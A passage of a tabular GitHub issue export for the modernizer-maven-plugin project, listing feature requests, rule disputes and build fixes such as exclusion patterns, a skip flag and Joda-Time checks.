Thanks,",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/52/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/52/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/52/events,https://github.com/gaul/modernizer-maven-plugin/issues/52,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/51,187580678,MDU6SXNzdWUxODc1ODA2Nzg=,51,Allow easier exclusion of many related checks,9230,closed,FALSE,NA,NA,3,2016-11-06T18:55:06Z,2017-01-17T22:59:39Z,2017-01-17T22:59:39Z,CONTRIBUTOR,NA,"We're trying to update the modernizer version, but recent versions added checks for Joda-Time, which plan to keep using for several reasons (performance, user provided formats in Joda-Time syntax, etc.). At this point, it seems the only option is to copy/paste 20+ exclusions, and repeat this any time we update (if modernizer adds more).

Two ideas on how to improve fix:

* Add more flexible exclusion, for example:
```xml
<exclusionPatterns>
  <exclusionPattern>org/joda/time/.*</exclusionPattern>
</exclusionPatterns>
```
* Add a group identifier for each violation and allow excluding by group. For example, exclude the `joda-time` group.

",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/51/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/51/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/51/events,https://github.com/gaul/modernizer-maven-plugin/issues/51,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/50,160038662,MDU6SXNzdWUxNjAwMzg2NjI=,50,gradle plugin,375693,closed,FALSE,NA,NA,4,2016-06-13T20:34:17Z,2016-12-11T13:32:04Z,2016-12-11T13:32:04Z,CONTRIBUTOR,NA,"This would make an excellent gradle plugin. :)
",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/50/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/50/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/50/events,https://github.com/gaul/modernizer-maven-plugin/issues/50,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/49,134221393,MDU6SXNzdWUxMzQyMjEzOTM=,49,Show messages as warning instead of error,16245857,closed,FALSE,NA,NA,1,2016-02-17T09:07:37Z,2017-01-24T06:59:31Z,2017-01-23T23:15:34Z,NONE,NA,"It would be nice if we could configure, all messages as WARNING. Because currently it looks very 'red' in our build system. And actually nothing is broken in our defenition.  
",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/49/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/49/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/49/events,https://github.com/gaul/modernizer-maven-plugin/issues/49,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/48,130866438,MDU6SXNzdWUxMzA4NjY0Mzg=,48,Provide skip configuration parameter (-Dmodernizer.skip),1280725,closed,FALSE,NA,NA,2,2016-02-03T00:30:44Z,2017-01-17T21:10:17Z,2017-01-17T21:10:17Z,NONE,NA,,NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/48/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/48/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/48/events,https://github.com/gaul/modernizer-maven-plugin/issues/48,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/47,130866263,MDU6SXNzdWUxMzA4NjYyNjM=,47,Generate plugin docs and publish to github.io pages,1280725,open,FALSE,NA,NA,2,2016-02-03T00:30:08Z,2018-10-28T02:47:13Z,NA,NONE,NA,,NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/47/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/47/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/47/events,https://github.com/gaul/modernizer-maven-plugin/issues/47,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/46,128968271,MDU6SXNzdWUxMjg5NjgyNzE=,46,Java 9 Convenience Factory Methods for Collections,848247,closed,FALSE,NA,NA,3,2016-01-26T22:48:36Z,2017-01-28T11:08:52Z,2017-01-17T22:50:01Z,OWNER,NA,"Evaluate closer to Java 9 release:

http://openjdk.java.net/jeps/269
",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/46/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/46/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/46/events,https://github.com/gaul/modernizer-maven-plugin/issues/46,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/45,121843581,MDU6SXNzdWUxMjE4NDM1ODE=,45,Update maven-checkstyle-plugin to 2.17,3623999,closed,FALSE,NA,NA,1,2015-12-12T09:10:21Z,2015-12-12T14:45:58Z,2015-12-12T14:45:41Z,NONE,NA,"Hi
Please, update maven-checkstyle-plugin to 2.17, cause:

```
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-checkstyle-plugin:2.12:check (checkstyle) on project modernizer-maven-plugin: Failed during checkstyle configuration: cannot initialize module TreeWalker - Unable to instantiate RedundantThrows: Unable to instantiate RedundantThrowsCheck -> [Help 1]
```

RedundantThrows was removed with version 6.2 (see https://github.com/checkstyle/checkstyle/issues/473)  and its reference should be removed in src/main/resources/checkstyle.xml
Thanks in advance
Regards
",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/45/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/45/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/45/events,https://github.com/gaul/modernizer-maven-plugin/issues/45,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/44,121842479,MDU6SXNzdWUxMjE4NDI0Nzk=,44,modernizer-maven-plugin don't include the license file,3623999,closed,FALSE,NA,NA,1,2015-12-12T08:38:02Z,2015-12-13T09:11:20Z,2015-12-12T14:41:42Z,NONE,NA,"Not available LICENSE file in source directory structure
Please. Added license and copyright notice.
the fedora packaging guideline is very strictly precise about this problem
https://fedoraproject.org/wiki/Packaging:LicensingGuidelines?rd=Packaging/LicensingGuidelines#License_Text
thanks
regards
",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/44/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/44/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/44/events,https://github.com/gaul/modernizer-maven-plugin/issues/44,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/43,117033348,MDU6SXNzdWUxMTcwMzMzNDg=,43,"should support and empty rule set (""do nothing"") configuration",39495,open,FALSE,NA,NA,1,2015-11-16T01:13:39Z,2017-01-17T23:05:28Z,NA,CONTRIBUTOR,NA,"It should be possible to ""turn off"" the default checks without having to specify any violations file. This would allow configuring the plugin in a stacked pom environment (having a base pom that wires up the plugin but does not impose any policy on a project) and the leave it to the actual projects to choose what checks it wants (e.g. turn on the default checks or supply a specific violations file). 
",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/43/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/43/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/43/events,https://github.com/gaul/modernizer-maven-plugin/issues/43,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/42,117033159,MDU6SXNzdWUxMTcwMzMxNTk=,42,violations file should be loadable from class path,39495,closed,FALSE,NA,NA,1,2015-11-16T01:10:20Z,2017-01-24T22:36:40Z,2017-01-24T22:36:40Z,CONTRIBUTOR,NA,"Most other plugins that need a resource (e.g. checkstyle, pmd, findbugs etc) support loading their resource file from the classpath. This allows packaging up all these policy files into a convenient jar and adding it as a dependency to the plugin(s). 

Modernizer only loads its internal file from the classpath and any user defined file is loaded with an explicit `new File(...)`. It should be possible to load user defined files from the class path.
",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/42/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/42/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/42/events,https://github.com/gaul/modernizer-maven-plugin/issues/42,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/41,117032974,MDU6SXNzdWUxMTcwMzI5NzQ=,41,modernizer erroneously recommends javax.inject.Inject over com.google.inject.Inject,39495,closed,FALSE,NA,NA,5,2015-11-16T01:07:28Z,2017-01-17T23:04:25Z,2017-01-17T23:04:25Z,CONTRIBUTOR,NA,"These two are not equivalent, as the google variant supports optional injection. See https://github.com/google/guice/blob/master/core/src/com/google/inject/Inject.java

So https://github.com/andrewgaul/modernizer-maven-plugin/blob/master/src/main/resources/modernizer.xml#L609-L613 is not correct.
",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/41/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/41/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/41/events,https://github.com/gaul/modernizer-maven-plugin/issues/41,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/40,117032678,MDU6SXNzdWUxMTcwMzI2Nzg=,40,modernizer is at odds with guava recommendations,39495,open,FALSE,NA,NA,1,2015-11-16T01:03:50Z,2016-11-06T19:13:20Z,NA,CONTRIBUTOR,NA,"According to https://code.google.com/p/guava-libraries/wiki/PreconditionsExplained, the guideline if using Guava in JDK7+ is 

--- snip ---
We preferred rolling our own preconditions checks over e.g. the comparable utilities from Apache Commons for a few reasons. Piotr Jagielski discusses why he prefers our utilities, but briefly:

After static imports, the Guava methods are clear and unambiguous. checkNotNull makes it clear what is being done, and what exception will be thrown.
checkNotNull returns its argument after validation, allowing simple one-liners in constructors: this.field = checkNotNull(field).
Simple, varargs ""printf-style"" exception messages. (This advantage is also why we recommend continuing to use checkNotNull over Objects.requireNonNull introduced in JDK 7.)
--- snip ---

which clashes with https://github.com/andrewgaul/modernizer-maven-plugin/blob/master/src/main/resources/modernizer.xml#L597-L607 
",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/40/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/40/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/40/events,https://github.com/gaul/modernizer-maven-plugin/issues/40,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/39,107660977,MDExOlB1bGxSZXF1ZXN0NDU2MzQyMDQ=,39,Remove Autowired,195367,closed,FALSE,NA,NA,3,2015-09-22T07:39:03Z,2017-01-18T07:09:06Z,2015-09-22T09:23:55Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/39/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/39/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/39/events,https://github.com/gaul/modernizer-maven-plugin/pull/39,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/39
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/38,99921859,MDExOlB1bGxSZXF1ZXN0NDE5NzU2OTY=,38,Add support for specifying exclusions in the POM.,513280,closed,FALSE,NA,NA,2,2015-08-09T19:36:21Z,2015-08-10T17:33:43Z,2015-08-10T17:31:47Z,CONTRIBUTOR,NA,"This change allows one to specify exclusions as part of the plugin configuration. Example:

```
<configuration> 
    <exclusions>    
        <exclusion>org/joda/time/DateTime.""&lt;init&gt;"":(J)V</exclusion>
    </exclusions>   
</configuration
```

This is more convenient than the `<exclusionsFile>` setting when one wishes to suppress certain violations across a multi-module build, because the plugin configuration can be placed in the parent POM and be made to apply to all submodules.

(The `<exclusionsFile>`, by contrast, either requires one to specify an absolute file, or create many violation files, one for each `pom.xml` in the build, all with the same relative path. I'm aware that that the exclusions file can also be read from the plugin's classpath, but that'd require me to package the violations file in a separate JAR and declare it as a plugin dependency. Also not nearly as convenient as the solution proposed here.)

Interested to hear what you think :)
",NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/38/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/38/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/38/events,https://github.com/gaul/modernizer-maven-plugin/pull/38,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/38
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/37,99890682,MDU6SXNzdWU5OTg5MDY4Mg==,37,@Inject is not always a drop in replacement for @Autowired,513280,closed,FALSE,NA,NA,3,2015-08-09T12:11:26Z,2015-09-22T09:24:11Z,2015-09-22T09:24:11Z,CONTRIBUTOR,NA,"The rule introduced in #26 seems to be slightly too strict. The plugin now also complains about `@Autowired(required = false)`, while there is no direct equivalent when using `@Inject`.

On could [work around](http://docs.jboss.org/weld/reference/latest/en-US/html/injection.html#_fixing_unsatisfied_and_ambiguous_dependencies) that (see also [this SO thread](https://stackoverflow.com/questions/19485878)), but it requires an additional dependency on `javax.enterprise.inject.Instance`.

I think the plugin should at least point the user in the right direction, or even better: not complain about `@Autowired(required = false)`. Thoughts?
",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/37/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/37/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/37/events,https://github.com/gaul/modernizer-maven-plugin/issues/37,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/36,94152036,MDExOlB1bGxSZXF1ZXN0Mzk2Mjg0NzA=,36,Add violations for Joda Time,1404810,closed,FALSE,NA,NA,4,2015-07-09T21:07:44Z,2015-08-09T07:23:22Z,2015-07-11T22:18:04Z,CONTRIBUTOR,NA,"I tried to cover the factories and constructors I reckon are the most commonly used without going over-board
",NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/36/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/36/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/36/events,https://github.com/gaul/modernizer-maven-plugin/pull/36,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/36
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/35,93244343,MDU6SXNzdWU5MzI0NDM0Mw==,35,RFC: Warn about use of methods that might block indefinitely,1210641,open,FALSE,NA,NA,2,2015-07-06T10:31:06Z,2019-12-04T10:12:55Z,NA,CONTRIBUTOR,NA,"This is more of an idea than an actual issue, so by all means shoot me down :)

Basically I'm currently reading through 'Release It' (http://www.amazon.com/dp/0978739213/), and one of the stability anti-patterns there is to not have proper timeouts (and handling of those). At least some of those are caused by the use of methods such as `Object#wait()`, so I was wondering whether modernizer could not help with that issue by flagging those uses (and suggest to use methods with a timeout).

Now, some issues I see immediately:
1. There might be reviewed-and-approved uses of those methods, so there needs to be an easy way to mark those as acceptable. (see https://github.com/andrewgaul/modernizer-maven-plugin/issues/3)
2. Not every user of modernizer might want to have those checks, especially since fixing the issues can be quite a bit of work, so it would be good to have those in a separate, optional, rules set (see https://github.com/andrewgaul/modernizer-maven-plugin/issues/22)
3. Coming up with a list of those methods will be quite some work as well: It's not just synchronization methods, but for example also things like Sockets, URL connections, Jersey clients ... and for some of those the way to set a timeout is with an additional method call.

What do you think? Is this a realistic use for modernizer, or is it too far out-of-scope?
",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/35/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/35/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/35/events,https://github.com/gaul/modernizer-maven-plugin/issues/35,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/34,92913075,MDExOlB1bGxSZXF1ZXN0MzkxODk2MjM=,34,Use process-test-classes phase in README example,1404650,closed,FALSE,NA,NA,4,2015-07-03T17:29:20Z,2018-10-30T04:50:30Z,2018-10-30T04:50:30Z,NONE,NA,"There should be no need for the user so sit through the tests before reaching the `validate` stage if the build should fail due to using legacy APIs.

`process-test-classes` makes the most sense because it's the first phase after all classes have been compiled, and works regardless of `includeTestClasses` value.
",NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/34/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/34/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/34/events,https://github.com/gaul/modernizer-maven-plugin/pull/34,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/34
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/33,92911488,MDU6SXNzdWU5MjkxMTQ4OA==,33,Warn when using Joda DateTime in JDK 8,1404810,closed,FALSE,NA,NA,6,2015-07-03T17:15:52Z,2015-07-11T22:18:04Z,2015-07-11T22:18:04Z,CONTRIBUTOR,NA,"Should use the `java.time`-package as much as possible
",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/33/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/33/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/33/events,https://github.com/gaul/modernizer-maven-plugin/issues/33,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/32,82522914,MDU6SXNzdWU4MjUyMjkxNA==,32,Add Javadoc to Mojo Parameters,848247,closed,FALSE,NA,NA,0,2015-05-29T17:53:05Z,2015-05-29T18:19:20Z,2015-05-29T18:19:20Z,OWNER,NA,"This improves the help text.  Suggested by @hgschmie at https://github.com/andrewgaul/modernizer-maven-plugin/pull/30#issuecomment-106879873.  Example:

https://github.com/basepom/duplicate-finder-maven-plugin/blob/master/src/main/java/org/basepom/mojo/duplicatefinder/DuplicateFinderMojo.java#L107-L254
",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/32/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/32/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/32/events,https://github.com/gaul/modernizer-maven-plugin/issues/32,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/31,82117536,MDExOlB1bGxSZXF1ZXN0MzY0NDkwMDY=,31,Add a skip flag.,39495,closed,FALSE,NA,NA,1,2015-05-28T20:47:31Z,2015-05-28T22:10:00Z,2015-05-28T22:10:00Z,CONTRIBUTOR,NA,"This allows to skip plugin execution with

```
<configuration>
  <skip>true</skip>
</configuration>
```

or -Dmodernizer.skip=true from the command line.

Every plugin should have a ""skip"" flag.
",NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/31/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/31/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/31/events,https://github.com/gaul/modernizer-maven-plugin/pull/31,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/31
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/30,82114123,MDExOlB1bGxSZXF1ZXN0MzY0NDgwODQ=,30,Use 'modernizer' prefix for plugin properties.,39495,closed,FALSE,NA,NA,4,2015-05-28T20:37:16Z,2015-05-29T18:09:51Z,2015-05-29T17:55:15Z,CONTRIBUTOR,NA,"- Switch to use the property attribute of the parameter annotation.
- prefix all plugin custom properties with 'modernizer.' to avoid
  clashes with other plugins.
",NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/30/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/30/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/30/events,https://github.com/gaul/modernizer-maven-plugin/pull/30,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/30
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/29,82114054,MDExOlB1bGxSZXF1ZXN0MzY0NDgwNjc=,29,add exclude for eclipse IDE,39495,closed,FALSE,NA,NA,0,2015-05-28T20:37:06Z,2015-05-28T22:07:35Z,2015-05-28T22:07:35Z,CONTRIBUTOR,NA,"this allows loading the project into Eclipse IDE without errors.
",NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/29/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/29/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/29/events,https://github.com/gaul/modernizer-maven-plugin/pull/29,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/29
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/28,73189642,MDU6SXNzdWU3MzE4OTY0Mg==,28,Option to ignore generated code,19093,closed,FALSE,NA,NA,14,2015-05-05T03:17:41Z,2020-03-15T06:59:18Z,2019-10-13T17:31:16Z,NONE,NA,"A lot of code generated via tools like immutables.org trigger warnings from the plugin, it would be nice to be able to disable the warmings for these files.

In general, these are all annotated with `javax.annotation.Generated`, unfortunately that's flagged as  `@Retention(SOURCE)` so can't be tracked at the `.class` level.

Thoughts?  Maybe add an exclusions list in the plugin configuration?
",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/28/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/28/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/28/events,https://github.com/gaul/modernizer-maven-plugin/issues/28,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/27,72395997,MDU6SXNzdWU3MjM5NTk5Nw==,27,Allow comments in exclusion file,848247,closed,FALSE,NA,NA,0,2015-05-01T09:57:36Z,2018-10-02T05:34:03Z,2018-10-02T05:34:03Z,OWNER,NA,"Suggested by @nacx.
",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/27/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/27/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/27/events,https://github.com/gaul/modernizer-maven-plugin/issues/27,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/26,69122680,MDExOlB1bGxSZXF1ZXN0MzM1MzY0MzU=,26,Add rule: Prefer @Inject over @Autowired,195367,closed,FALSE,NA,NA,2,2015-04-17T11:39:10Z,2015-05-04T07:34:07Z,2015-05-01T10:33:29Z,CONTRIBUTOR,NA,"Spring supports @Inject as well so I think it should be recommended to use it instead.
",NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/26/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/26/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/26/events,https://github.com/gaul/modernizer-maven-plugin/pull/26,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/26
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/25,59864372,MDExOlB1bGxSZXF1ZXN0MzA1MDU4ODI=,25,Detect two variations of Preconditions.checkNotNull,513280,closed,FALSE,NA,NA,2,2015-03-04T21:24:09Z,2015-03-05T05:42:12Z,2015-03-04T21:59:47Z,CONTRIBUTOR,NA,"Details in the commit message:

```
Guava provides three versions of Preconditions.checkNotNull:
- One that doesn't take a custom exception message.
- One that lazily converts an arbitrary object into an exception message, using
  String#valueOf, if necessary.
- One that constructs an exception message based on a given format pattern and
  zero or more arguments.

The third one has no equally-convenient (i.e. concise) counterpart in any
version of Java. But the first two do, in Java 7 and 8, respectively:
- Java 8 allows one to provide a Supplier for the lazy message construction,
  which support for lambda expressions makes trivial.
- Strictly speaking Java 7 also provides an alternative for the second variant,
  but it's more restricted signature means that it doesn't have the nice lazy
  string construction semantics. Hence the decision to only warn for that
  variant when Java 8 is used.
```
",NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/25/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/25/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/25/events,https://github.com/gaul/modernizer-maven-plugin/pull/25,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/25
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/24,58890981,MDExOlB1bGxSZXF1ZXN0Mjk5ODE0Mzg=,24,Check annotation classes for violations,1210641,closed,FALSE,NA,NA,0,2015-02-25T12:02:42Z,2015-02-25T19:31:08Z,2015-02-25T19:04:45Z,CONTRIBUTOR,NA,"This adds support for flagging violations for wrong annotation classes. This is a requirement for #23.

Note that the test does not rely on any specific invalid annotation, but uses its own dummy annotation.
",NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/24/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/24/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/24/events,https://github.com/gaul/modernizer-maven-plugin/pull/24,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/24
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/23,58882275,MDExOlB1bGxSZXF1ZXN0Mjk5NzY0OTM=,23,Add violations for com.google.inject.Inject and com.google.inject.Provider,1210641,closed,FALSE,NA,NA,3,2015-02-25T10:40:48Z,2015-02-25T19:31:00Z,2015-02-25T19:04:45Z,CONTRIBUTOR,NA,"These are (almost) always replaceable with the javax.inject variants, which would also
work with other DI frameworks.
",NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/23/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/23/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/23/events,https://github.com/gaul/modernizer-maven-plugin/pull/23,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/23
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/22,57106633,MDU6SXNzdWU1NzEwNjYzMw==,22,Allow multiple violations files,848247,closed,FALSE,NA,NA,0,2015-02-09T23:26:33Z,2017-01-24T22:36:40Z,2017-01-24T22:36:40Z,OWNER,NA,"This will allow users to migrate between different libraries, e.g., Apache Commons to Google Guava.  Continuing on from discussion in #21.
",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/22/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/22/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/22/events,https://github.com/gaul/modernizer-maven-plugin/issues/22,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/21,53762664,MDU6SXNzdWU1Mzc2MjY2NA==,21,Apache Commons Collections,5819790,open,FALSE,NA,NA,5,2015-01-08T15:31:15Z,2015-06-23T21:29:05Z,NA,NONE,NA,"Should there be provisions in the configuration to look for usages from Apache Commons Collections, like functions, closures, etc.?
",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/21/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/21/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/21/events,https://github.com/gaul/modernizer-maven-plugin/issues/21,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/20,53185797,MDExOlB1bGxSZXF1ZXN0MjY3MjUyNjQ=,20,fix StringIndexOutOfBoundsException for classes with default package,204013,closed,FALSE,NA,NA,3,2014-12-31T14:20:49Z,2015-01-01T21:00:06Z,2014-12-31T19:08:57Z,CONTRIBUTOR,NA,"see https://github.com/andrewgaul/modernizer-maven-plugin/issues/19
